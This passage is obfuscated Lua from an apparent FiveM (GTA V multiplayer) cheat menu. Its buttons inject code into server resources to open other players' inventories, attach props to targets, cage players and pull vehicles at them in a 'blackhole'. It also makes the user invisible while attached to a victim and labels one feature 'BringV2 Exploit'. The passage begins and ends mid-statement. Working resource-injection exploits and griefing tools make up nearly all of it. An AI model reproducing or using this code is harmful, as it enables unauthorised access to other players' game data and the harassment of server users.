end);end);MachoMenuButton(v88,"Follow and Open Inventory / Leave",function() if v106 then local v536=104 -(103 + 1) ;local v537;while true do if (v536==(556 -(475 + 79))) then if v111 then SetEntityCoords(v537,v111.x,v111.y,v111.z,false,false,false,false);end SetEntityVisible(v537,true,false);NetworkSetEntityInvisibleToNetwork(v537,false);v536=6 -3 ;end if (v536==3) then ResetEntityAlpha(v537);v114=false;MachoMenuNotification("Follow","Follow left and returned.");v536=4;end if (v536==1) then v115(false);if DoesEntityExist(v108) then ClearPedTasks(v108);end v108=nil;v536=2;end if (v536==(12 -8)) then return;end if (0==v536) then v537=PlayerPedId();v106=false;DetachEntity(v537,true,false);v536=1;end end end local v336=tonumber(MachoMenuGetInputbox(v116));if ( not v336 or (v336<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid ID!");return;end local v337=GetPlayerFromServerId(v336);if (v337== -1) then local v538=0 + 0 ;while true do if (v538==(1503 -(1395 + 108))) then MachoMenuNotification("Error","Player not found.");return;end end end local v338=PlayerPedId();local v339=GetPlayerPed(v337);if  not DoesEntityExist(v339) then local v539=0 -0 ;while true do if (v539==(1204 -(7 + 1197))) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end end end v106=true;v108=v339;v111=GetEntityCoords(v338);SetEntityVisible(v338,false,false);NetworkSetEntityInvisibleToNetwork(v338,true);SetEntityAlpha(v338,0,false);v114=true;AttachEntityToEntity(v338,v339,5152 + 6664 ,0.5 + 0 ,319 -(27 + 292) ,0 -0 ,0 -0 ,0,0,false,false,false,false,2,true);local v340,v341="missminuteman_1ig_2","handsup_base";RequestAnimDict(v340);while  not HasAnimDictLoaded(v340) do Wait(0 -0 );end TaskPlayAnim(v339,v340,v341,15 -7 , -8, -1,49,0,false,false,false);CreateThread(function() while v106 do local v540=0;while true do if (v540==(0 -0)) then Wait(144 -(43 + 96) );if IsPauseMenuActive() then local v899=0 -0 ;while true do if (v899==2) then if v111 then SetEntityCoords(v338,v111.x,v111.y,v111.z,false,false,false,false);end v108=nil;v899=3;end if (v899==(6 -3)) then v114=false;MachoMenuNotification("Follow","Follow ended, returned to position.");break;end if (v899==1) then v115(false);if DoesEntityExist(v108) then ClearPedTasks(v108);end v899=2 + 0 ;end if (v899==(0 + 0)) then v106=false;DetachEntity(v338,true,false);v899=1;end end end v540=1 -0 ;end if (v540==1) then if v114 then local v900=0 + 0 ;local v901;while true do if (v900==(0 -0)) then v901=PlayerPedId();SetEntityVisible(v901,false,false);v900=1;end if ((1 + 0)==v900) then NetworkSetEntityInvisibleToNetwork(v901,true);SetEntityAlpha(v901,0,false);v900=1 + 1 ;end if (v900==(1753 -(1414 + 337))) then SetEntityLocallyVisible(v901);SetEntityAlpha(v901,255,false);break;end end end break;end end end end);TriggerEvent("ox_inventory:openInventory","otherplayer",v336);end);MachoMenuButton(v88,"Open Nearby Player's Inventory (OX)",function() MachoInjectResource("ox_inventory",[[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local function ForceAnimationOnPlayer(ped)
            local dict = "dead"
            local anim = "dead_a"

            if not HasAnimDictLoaded(dict) then
                RequestAnimDict(dict)
                while not HasAnimDictLoaded(dict) do
                    Wait(10)
                end
            end

            TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local targetPed = GetPlayerPed(closestPlayer)
            ForceAnimationOnPlayer(targetPed)
            TriggerEvent('ox_inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
        else
            TriggerEvent('chat:addMessage', { args = { '^1Inventory:', 'No nearby player found!' } })
        end
    ]]);end);MachoMenuButton(v88,"Open Nearby Player's Inventory (QB)",function() MachoInjectResource("monitor",[[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local serverId = GetPlayerServerId(closestPlayer)
            -- Try QB inventory event
            TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", serverId)
            
            -- Show notification
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~g~Opened inventory of nearby player!~w~ (ID: " .. serverId .. ")")
            DrawNotification(false, false)
        else
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~r~No nearby player found!")
            DrawNotification(false, false)
        end
    ]]);end);local v117=MachoMenuInputbox(v88,"QB Player ID to Open","e.g., 123");MachoMenuButton(v88,"Open QB Player Inventory (By ID)",function() local v342=1940 -(1642 + 298) ;local v343;while true do if (v342==0) then v343=MachoMenuGetInputbox(v117);if (v343 and (v343~="")) then local v806=tonumber(v343);if (v806 and (v806>0)) then local v902=0;while true do if (v902==(0 -0)) then MachoInjectResource("monitor",string.format([[
                TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", %d)
                
                SetNotificationTextEntry("STRING")
                AddTextComponentString("~g~Opened inventory for player ID: ~b~" .. %d)
                DrawNotification(false, false)
            ]],v806,v806));MachoMenuNotification("QB Inventory","Opening inventory for player ID: "   .. v806 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end else MachoMenuNotification("Error","Please enter a player ID!");end break;end end end);local v118=MachoMenuInputbox(v88,"Target Player ID (Attach Jet)","e.g., 123");MachoMenuButton(v88,"ZT Attach Jet",function() local v344=tonumber(MachoMenuGetInputbox(v118));if (v344 and (v344>0)) then MachoMenuNotification("Attach Jet","Attaching jet to ID: "   .. v344 );local v541=nil;if (GetResourceState("monitor")=="started") then v541="monitor";elseif (GetResourceState("qb-core")=="started") then v541="qb-core";else v541="ox_inventory";end MachoInjectResource2(NewThreadNs,v541,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Jet: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Jet: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Jet: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_med_jet_01")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Jet: Attached jet to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Jet:', 'Attached jet to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Jet: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Failed to load object model!' } })
            end
        ]],v344));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v119=MachoMenuInputbox(v88,"Target Player ID (Attach Box)","e.g., 123");MachoMenuButton(v88,"ZT Attach Box",function() local v345=tonumber(MachoMenuGetInputbox(v119));if (v345 and (v345>0)) then MachoMenuNotification("Attach Box","Attaching box to ID: "   .. v345 );local v542=nil;if (GetResourceState("monitor")=="started") then v542="monitor";elseif (GetResourceState("qb-core")=="started") then v542="qb-core";else v542="ox_inventory";end MachoInjectResource2(NewThreadNs,v542,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Box: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Box: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Box: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("xm3_prop_xm3_box_wood03a")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Box: Attached box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Box:', 'Attached box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Box: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Failed to load object model!' } })
            end
        ]],v345));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v120=MachoMenuInputbox(v88,"Target Player ID (Attach Cone)","e.g., 123");MachoMenuButton(v88,"ZT Attach Cone",function() local v346=0;local v347;while true do if (v346==0) then v347=tonumber(MachoMenuGetInputbox(v120));if (v347 and (v347>(0 -0))) then MachoMenuNotification("Attach Cone","Attaching cone to ID: "   .. v347 );local v807=nil;if (GetResourceState("monitor")=="started") then v807="monitor";elseif (GetResourceState("qb-core")=="started") then v807="qb-core";else v807="ox_inventory";end MachoInjectResource2(NewThreadNs,v807,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Cone: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Cone: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Cone: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_roadcone01b")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Cone: Attached cone to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Cone:', 'Attached cone to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Cone: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Failed to load object model!' } })
            end
        ]],v347));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v121=MachoMenuInputbox(v88,"Target Player ID (Attach Juke)","e.g., 123");MachoMenuButton(v88,"ZT Attach Juke Box",function() local v348=0 -0 ;local v349;while true do if (v348==(0 + 0)) then v349=tonumber(MachoMenuGetInputbox(v121));if (v349 and (v349>(0 + 0))) then MachoMenuNotification("Attach Juke","Attaching juke box to ID: "   .. v349 );local v808=nil;if (GetResourceState("monitor")=="started") then v808="monitor";elseif (GetResourceState("qb-core")=="started") then v808="qb-core";else v808="ox_inventory";end MachoInjectResource2(NewThreadNs,v808,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Juke: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Juke: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Juke: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_jukebox_02")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Juke: Attached juke box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Juke:', 'Attached juke box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Juke: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Failed to load object model!' } })
            end
        ]],v349));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);function CagePlayer(v350) local v351=GetPlayerPed(v350);if ( not v351 or (v351<=(972 -(357 + 615)))) then MachoMenuNotification("Error!","Invalid player ped.");return;end local v352=GetEntityCoords(v351);if  not v352 then local v543=0 + 0 ;while true do if (v543==(0 -0)) then MachoMenuNotification("Error!","Could not get player coordinates.");return;end end end local v353=IsPedInAnyVehicle(v351);if v353 then local v544=0 + 0 ;local v545;local v546;while true do if (v544==(0 -0)) then v545=CreateObject(GetHashKey("prop_metal_detector"),v352.x-(5.8 + 1) ,v352.y + 1 + 0 ,v352.z-1.5 ,false,true,true);SetEntityHeading(v545,57 + 33 );CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x-(1301.6 -(384 + 917)) ,v352.y + (703.8 -(128 + 569)) ,v352.z-(1544.5 -(1407 + 136)) ,false,true,true);v544=1;end if (v544==(1889 -(687 + 1200))) then v545=CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x-(1716.8 -(556 + 1154)) ,v352.y + (3 -2) ,v352.z + (96.3 -(9 + 86)) ,false,true,true);SetEntityHeading(v545,511 -(275 + 146) );CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x-0.6 ,v352.y + 1.7999999999999998 + 5 ,v352.z + (65.3 -(29 + 35)) ,false,true,true);v544=3;end if (v544==(4 -3)) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x-0.6 ,v352.y-(11.8 -7) ,v352.z-(4.5 -3) ,false,true,true);v546=CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x + 4.8 ,v352.y + 1 + 0 ,v352.z-(1013.5 -(53 + 959)) ,false,true,true);SetEntityHeading(v546,498 -(312 + 96) );v544=3 -1 ;end if (v544==(288 -(147 + 138))) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x-0.6 ,v352.y-(903.8 -(813 + 86)) ,v352.z + 1.3 ,false,true,true);v546=CreateObject(GetHashKey("prop_const_fence03b_cr"),v352.x + 4.8 + 0 ,v352.y + (1 -0) ,v352.z + 1.3 ,false,true,true);SetEntityHeading(v546,582 -(18 + 474) );break;end end else local v547=0 + 0 ;local v548;local v549;local v550;local v551;local v552;local v553;local v554;local v555;while true do if (v547==0) then v548=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-0.6 ,v352.y-(3 -2) ,v352.z-1 ,true,true,true);FreezeEntityPosition(v548,true);v549=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-0.55 ,v352.y-(1087.05 -(860 + 226)) ,v352.z-(304 -(121 + 182)) ,true,true,true);SetEntityHeading(v549,90);v547=1;end if (v547==3) then v553=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-0.55 ,v352.y-(1.05 + 0) ,v352.z + (1241.5 -(988 + 252)) ,true,true,true);SetEntityHeading(v553,11 + 79 );FreezeEntityPosition(v553,true);v554=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-(0.6 + 0) ,v352.y + 0.6 ,v352.z + 1.5 ,true,true,true);v547=1974 -(49 + 1921) ;end if (v547==(892 -(223 + 667))) then SetEntityHeading(v551,142 -(51 + 1) );FreezeEntityPosition(v551,true);v552=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-(0.6 -0) ,v352.y-(1 -0) ,v352.z + 1.5 ,true,true,true);FreezeEntityPosition(v552,true);v547=3;end if (v547==1) then FreezeEntityPosition(v549,true);v550=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x-(1125.6 -(146 + 979)) ,v352.y + 0.6 + 0 ,v352.z-(606 -(311 + 294)) ,true,true,true);FreezeEntityPosition(v550,true);v551=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x + (2.05 -1) ,v352.y-(1.05 + 0) ,v352.z-(1444 -(496 + 947)) ,true,true,true);v547=1360 -(1233 + 125) ;end if (v547==(2 + 2)) then FreezeEntityPosition(v554,true);v555=CreateObject(GetHashKey("prop_fnclink_03gate5"),v352.x + 1.05 + 0 ,v352.y-(1.05 + 0) ,v352.z + 1.5 ,true,true,true);SetEntityHeading(v555,1735 -(963 + 682) );FreezeEntityPosition(v555,true);break;end end end end local v122=MachoMenuInputbox(v87,"Cage Target Player ID","e.g., 123");MachoMenuButton(v87,"Cage Player",function() local v354=0 + 0 ;local v355;while true do if (v354==0) then v355=tonumber(MachoMenuGetInputbox(v122));if (v355 and (v355>(1504 -(504 + 1000)))) then local v809=0;while true do if (0==v809) then MachoInjectResource("monitor",string.format([[
            local targetClientId = GetPlayerFromServerId(%d)
            if targetClientId == -1 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Player not found! ID: %d' } })
                return
            end
            local ped = GetPlayerPed(targetClientId)
            if not ped or ped <= 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Invalid player ped! ID: %d' } })
                return
            end
            local coords = GetEntityCoords(ped)
            if not coords then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Could not get coordinates! ID: %d' } })
                return
            end
            local inveh = IsPedInAnyVehicle(ped)
            if inveh then
                local obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, false, true, true)
                local obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj2, 90.0)
                obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, false, true, true)
                obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj2, 90.0)
            else
                local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj, true)
                local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj2, 90.0)
                FreezeEntityPosition(obj2, true)
                local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj3, true)
                local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj4, 90.0)
                FreezeEntityPosition(obj4, true)
                local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj5, true)
                local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj6, 90.0)
                FreezeEntityPosition(obj6, true)
                local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj7, true)
                local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj8, 90.0)
                FreezeEntityPosition(obj8, true)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Cage:', 'Cage created! Player ID: %d' } })
        ]],v355,v355,v355,v355,v355));MachoMenuNotification("Cage","Cage created! Player ID: "   .. v355 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v123=false;local v124=nil;local v125={};local v126={"adder","comet2","elegy2","banshee","sultan"};local function v127() return v126[math.random(1 + 0 , #v126)];end local function v128(v356) v123=true;v124=GetPlayerPed(GetPlayerFromServerId(v356));if ( not v124 or  not DoesEntityExist(v124)) then MachoMenuNotification("Error","Player ID "   .. v356   .. " not found!" );v123=false;return;end local v357=GetEntityCoords(v124);v125={};for v487=1 -0 ,5 + 0  do local v488=v127();local v489=GetHashKey(v488);RequestModel(v489);while  not HasModelLoaded(v489) do Citizen.Wait(0 + 0 );end local v490=math.random( -5,5);local v491=math.random( -5,187 -(156 + 26) );local v492=CreateVehicle(v489,v357.x + v490 ,v357.y + v491 ,v357.z,0,true,true);if DoesEntityExist(v492) then local v701=0 + 0 ;local v702;while true do if (v701==(2 -0)) then table.insert(v125,v492);break;end if (v701==(165 -(149 + 15))) then SetNetworkIdCanMigrate(v702,true);SetNetworkIdExistsOnAllMachines(v702,true);v701=962 -(890 + 70) ;end if (v701==(117 -(39 + 78))) then NetworkRegisterEntityAsNetworked(v492);v702=NetworkGetNetworkIdFromEntity(v492);v701=483 -(14 + 468) ;end end end SetModelAsNoLongerNeeded(v489);end MachoMenuNotification("Info","Blackhole started, target ID: "   .. v356 );MachoInjectResource("monitor",string.format([[
        _G.isBlackholeActive = true
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            while _G.isBlackholeActive and DoesEntityExist(targetPed) do
                local targetCoords = GetEntityCoords(targetPed)
                local handle, vehicle = FindFirstVehicle()
                local vehicles = {}
                local success
                repeat
                    if DoesEntityExist(vehicle) then
                        local vehCoords = GetEntityCoords(vehicle)
                        if #(targetCoords - vehCoords) < 50.0 then
                            table.insert(vehicles, vehicle)
                        end
                    end
                    success, vehicle = FindNextVehicle(handle)
                until not success
                EndFindVehicle(handle)

                for _, vehicle in ipairs(vehicles) do
                    if DoesEntityExist(vehicle) then
                        NetworkRegisterEntityAsNetworked(vehicle)
                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                        SetNetworkIdCanMigrate(netId, true)
                        SetNetworkIdExistsOnAllMachines(netId, true)

                        local vehCoords = GetEntityCoords(vehicle)
                        local direction = (targetCoords - vehCoords)
                        local distance = #(targetCoords - vehCoords)
                        if distance > 2.0 then
                            local speed = 25.0
                            local velocity = direction / distance * speed
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z + 5.0)
                        end
                    end
                end

                Citizen.Wait(200)
            end
        end)
    ]],v356));end local function v129() local v358=0;while true do if ((2 -1)==v358) then v124=nil;v125={};v358=5 -3 ;end if (v358==2) then MachoMenuNotification("Info","Blackhole stopped.");MachoInjectResource("monitor",[[
        _G.isBlackholeActive = false
    ]]);break;end if (v358==0) then if  not v123 then local v810=0;while true do if (0==v810) then MachoMenuNotification("Error","Blackhole is not active!");return;end end end v123=false;v358=1 + 0 ;end end end local function v130(v359) local v360=0 + 0 ;while true do if (v360==0) then MachoInjectResource("monitor",string.format([[
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            TriggerEvent('chat:addMessage', { args = { '^1Error:', 'Player not found! ID: %d' } })
            return
        end
        local targetCoords = GetEntityCoords(targetPed)
        local model = "drafter"
        local modelHash = GetHashKey(model)
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end
        local offsetX = math.random(-5, 5)
        local offsetY = math.random(-5, 5)
        local vehicle = CreateVehicle(modelHash, targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z, 0.0, true, true)
        if DoesEntityExist(vehicle) then
            NetworkRegisterEntityAsNetworked(vehicle)
            local netId = NetworkGetNetworkIdFromEntity(vehicle)
            SetNetworkIdCanMigrate(netId, true)
            SetNetworkIdExistsOnAllMachines(netId, true)
            TriggerEvent('chat:addMessage', { args = { '^2Info:', 'Drafter vehicle spawned, target ID: %d' } })
        end
        SetModelAsNoLongerNeeded(modelHash)
    ]],v359,v359,v359));MachoMenuNotification("Info","Drafter vehicle spawned, target ID: "   .. v359 );break;end end end local v131=MachoMenuInputbox(v88,"Target Player ID","e.g., 123");MachoMenuButton(v88,"Start Blackhole",function() if v123 then local v556=0 + 0 ;while true do if (v556==0) then MachoMenuNotification("Error","Blackhole is already active! Stop it first.");return;end end end local v361=tonumber(MachoMenuGetInputbox(v131));if ( not v361 or (v361<=(0 + 0))) then local v557=0 + 0 ;while true do if (0==v557) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end local v362=GetPlayerFromServerId(v361);if (v362== -1) then local v558=0 -0 ;while true do if (v558==(0 + 0)) then MachoMenuNotification("Error","Player not found! ID: "   .. v361 );return;end end end local v363=GetPlayerPed(v362);if ( not v363 or (v363<=0)) then local v559=0 -0 ;while true do if (v559==(0 + 0)) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v361 );return;end end end v128(v361);end);MachoMenuButton(v88,"Stop Blackhole",function() v129();end);MachoMenuButton(v88,"Spawn Vehicle",function() local v364=51 -(12 + 39) ;local v365;local v366;local v367;while true do if (v364==(1 + 0)) then v366=GetPlayerFromServerId(v365);if (v366== -(2 -1)) then MachoMenuNotification("Error","Player not found! ID: "   .. v365 );return;end v364=6 -4 ;end if (v364==0) then v365=tonumber(MachoMenuGetInputbox(v131));if ( not v365 or (v365<=(0 + 0))) then local v811=0 + 0 ;while true do if (v811==(0 -0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v364=1;end if (v364==3) then v130(v365);break;end if ((2 + 0)==v364) then v367=GetPlayerPed(v366);if ( not v367 or (v367<=(0 -0))) then local v812=0;while true do if (v812==(1710 -(1596 + 114))) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v365 );return;end end end v364=3;end end end);local function v132() local v368=0 -0 ;while true do if (v368==(715 -(164 + 549))) then _G['isBlackholeActive']=nil;_G['targetPed']=nil;v368=1441 -(1059 + 379) ;end if (v368==(3 -0)) then _G['vehicles']=nil;break;end if (v368==(0 + 0)) then _G['GetRandomVehicleModel']=nil;_G['StartBlackhole']=nil;v368=1 + 0 ;end if (v368==(393 -(145 + 247))) then _G['StopBlackhole']=nil;_G['SpawnDrafter']=nil;v368=2 + 0 ;end end end Citizen.CreateThread(function() Citizen.Wait(463 + 537 );v132();end);MachoMenuText(v88,"BringV2 Exploit");local v133=MachoMenuInputbox(v88,"Target ID","e.g., 668");MachoMenuButton(v88,"Start BringV2",function() local v369=0;local v370;while true do if (v369==0) then v370=tonumber(MachoMenuGetInputbox(v133));if (v370 and (v370>(0 -0))) then MachoMenuNotification("Carry System","Carry 